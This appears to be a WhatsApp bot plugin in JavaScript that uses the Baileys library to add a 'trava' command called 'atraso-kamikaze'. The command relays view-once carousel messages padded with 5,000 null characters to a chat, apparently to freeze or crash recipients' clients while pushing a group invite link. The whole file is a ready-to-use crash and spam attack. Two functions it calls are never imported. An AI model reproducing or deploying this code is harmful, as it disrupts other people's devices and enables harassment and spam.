import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

let handler = async (m, { conn, args }) => {
  const target = m.chat;
  const imagePath = './src/foto.jpg';
  const groupLink = "https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE";
  const travaSend = 3; // Puedes cambiar cuántas veces enviar

  const media = await prepareWAMessageMedia({ image: { url: imagePath } }, { upload: conn.waUploadToServer });

  const makeCard = () => ({
    header: {
      ...media.imageMessage,
      title: `\n${groupLink}\n`,
      gifPlayback: true,
      subtitle: " ",
      hasMediaAttachment: false
    },
    body: {
      text: "🎠 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛"
    },
    nativeFlowMessage: {
      buttons: [{
        name: "cta_url",
        buttonParamsJson: JSON.stringify({
          display_text: "Unirme 🚪",
          url: groupLink,
          merchant_url: groupLink
        })
      }]
    }
  });

  const cards = Array.from({ length: 10 }, makeCard);

  const msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: "🎠 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛\n\n" + "\0".repeat(5000) },
          carouselMessage: {
            cards
          }
        }
      }
    }
  };

  for (let i = 0; i < travaSend; i++) {
    await conn.relayMessage(target, msg, { messageId: generateMessageID() });
  }
};

handler.command = ['atraso-kamikaze'];
export default handler;